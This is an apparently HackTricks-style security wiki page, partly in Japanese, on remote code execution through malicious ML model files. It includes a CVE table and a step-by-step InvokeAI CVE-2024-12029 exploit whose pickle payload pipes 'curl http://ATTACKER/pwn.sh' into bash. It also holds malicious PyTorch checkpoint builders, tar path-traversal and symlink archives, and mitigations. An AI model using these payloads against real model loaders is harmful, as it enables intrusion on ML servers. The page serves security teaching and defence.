# モデル RCE

{{#include ../banners/hacktricks-training.md}}

## モデルをRCEにロードする

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

執筆時点で、以下はこの種の脆弱性の例です:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI の `torch.load` 経由の RCE (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

内部では、このエンドポイントは最終的に次を呼び出します:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
渡されたファイルが **PyTorch checkpoint (`*.ckpt`)** の場合、`torch.load` は **pickle deserialization** を実行します。コンテンツがユーザー制御の URL から直接取得されるため、攻撃者はカスタム `__reduce__` メソッドを持つ悪意あるオブジェクトを checkpoint 内に埋め込むことができます。これらのメソッドは **during deserialization** 中に実行され、InvokeAI サーバー上で **remote code execution (RCE)** を引き起こします。

この脆弱性には **CVE-2024-12029**（CVSS 9.8、EPSS 61.17 %）が割り当てられました。

#### エクスプロイトの手順

1. 悪意のある checkpoint を作成する:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 自分が管理する HTTP サーバーに `payload.ckpt` をホストする（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーする（認証不要）:
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI がファイルをダウンロードすると `torch.load()` を呼び出し → `os.system` gadget が実行され、攻撃者は InvokeAI プロセスのコンテキストでコード実行を得る。

既製の exploit: **Metasploit** モジュール `exploit/linux/http/invokeai_rce_cve_2024_12029` がフロー全体を自動化する。

#### Conditions

•  InvokeAI 5.3.1-5.4.2（scan flag のデフォルトは **false**）  
•  攻撃者から `/api/v2/models/install` に到達可能であること  
•  プロセスが shell commands を実行する権限を持っていること

#### Mitigations

* **InvokeAI ≥ 5.4.3** にアップグレードする — このパッチはデフォルトで `scan=True` を設定し、デシリアライズ前にマルウェアスキャンを実行する。  
* プログラムでチェックポイントを読み込む際は `torch.load(file, weights_only=True)` を使うか、新しい [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) ヘルパーを使う。  
* モデルのソースに対して allow-lists / signatures を適用し、サービスを最小権限で実行する。

> ⚠️ 覚えておいてください：**任意の** Python の pickle-based 形式（多くの `.pt`, `.pkl`, `.ckpt`, `.pth` ファイルを含む）は、信頼できないソースからデシリアライズすることが本質的に危険です。

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Transformers4Rec の unsafe `torch.load` を介した RCE (CVE-2025-23298)

NVIDIAのTransformers4Rec（Merlinの一部）は、ユーザ提供のパスに対して直接`torch.load()`を呼び出す安全でない checkpoint loader を公開していました。`torch.load`はPythonの`pickle`に依存するため、攻撃者が制御する checkpoint はデシリアライズ中の reducer を介して任意のコードを実行できます。

脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

なぜこれがRCEにつながるか: Pythonのpickleでは、オブジェクトが reducer（`__reduce__`/`__setstate__`）を定義して呼び出し可能と引数を返すことができます。呼び出し可能はデシリアライズ（unpickling）時に実行されます。そのようなオブジェクトが checkpoint に含まれていると、weights が使用される前に実行されます。

最小の悪意のある checkpoint の例:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- リポジトリ、バケット、または artifact registries 経由で共有されるトロイ化された checkpoints/models
- チェックポイントを自動でロードする自動 resume/deploy パイプライン
- 実行は training/inference workers 内で発生し、しばしば特権昇格された状態で動作する（例: root in containers）

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) では直接の `torch.load()` を、`transformers4rec/utils/serialization.py` に実装された許可リスト方式のデシリアライザに置き換えました。新しいローダは型/フィールドを検証し、ロード中に任意の callables が呼び出されるのを防ぎます。

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルを読み込む:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## モデルを使った Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), 多くの AI フレームワークで使用されるモデル形式はアーカイブ（通常は `.zip`）に基づいています。そのため、これらの形式を悪用して path traversal attacks を行い、モデルがロードされるシステム上の任意のファイルを読み取ることが可能になる場合があります。

例えば、次のコードを使うと、ロードされたときに `/tmp` ディレクトリにファイルを作成するモデルを作成できます:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
あるいは、次のコードを使うと、読み込まれたときに `/tmp` ディレクトリへの symlink を作成するモデルを作成できます:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 詳細解析: Keras .keras deserialization and gadget hunting

.keras internals、Lambda-layer RCE、≤ 3.8 における arbitrary import issue、そして allowlist 内での post-fix gadget discovery に関する詳細なガイドは、次を参照してください:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考資料

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
